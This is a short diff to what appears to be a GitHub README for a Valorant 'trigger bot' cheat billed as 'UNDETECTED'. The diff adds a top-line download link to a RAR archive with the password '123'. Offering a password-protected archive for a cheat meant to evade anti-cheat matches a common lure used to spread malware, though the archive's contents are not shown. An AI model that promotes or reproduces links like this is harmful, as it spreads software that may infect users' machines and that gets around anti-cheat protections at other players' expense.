@@ -1,3 +1,4 @@
+# [Download](https://github.com/kickherzloy/Valorant-Trigger-PixelColor/releases/download/valorant/TriggerBot.Valorant.rar) | Pass: 123
 # Valorant Trigger External | UNDETECTED 🎯
 
 A program to enhance your gaming experience in Valorant with customizable triggers and other useful features.
